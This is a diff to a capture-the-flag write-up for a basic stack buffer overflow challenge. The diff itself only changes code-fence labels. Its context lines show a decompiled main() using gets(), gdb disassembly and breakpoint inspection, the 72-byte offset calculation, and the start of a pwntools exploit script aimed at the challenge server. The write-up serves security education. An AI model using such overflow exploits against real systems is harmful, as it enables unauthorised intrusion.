@@ -19,7 +19,7 @@ not too exciting.
 Downloading the binary and opening with Ghidra, we see it's an x64 ELF.
 Ghidra finds two functions:
 
-``` c
+```c
   undefined8 main(void) {
         char local_48[64];
         gets(local_48);
@@ -48,7 +48,7 @@ so we need to write 64 bytes to get past the input buffer, then write 8 bytes
 to get past the saved rbp, then write our 8 byte address.
 Disassemble main with gdb:
 
-``` console
+```bash
 (gdb) disas main
 Dump of assembler code for function main:
    0x0000000000401156 <+0>:     push   %rbp
@@ -67,7 +67,7 @@ End of assembler dump.
 
 Set a breakpoint immediately after the call to gets() and inspect the frame:
 
-``` console
+```bash
 (gdb) b *0x40116f
 Breakpoint 1 at 0x40116f
 (gdb) r
@@ -93,7 +93,7 @@ we typed and confirm it is at 0x7fffffffdd88 + 72, but we'll just give it a try.
 
 Now we have everything we need to write our attack script:
 
-``` python
+```python
 from pwn import *
 
 target = remote("34.123.15.202", 5000)
@@ -107,7 +107,7 @@ target.interactive()
 
 Time to send it:
 
-``` console
+```bash
 (kali㉿kali)-[~/ctfs/uoftctf2024/basic-overflow]
 $ python exploit.py
 [+] Opening connection to 34.123.15.202 on port 5000: Done
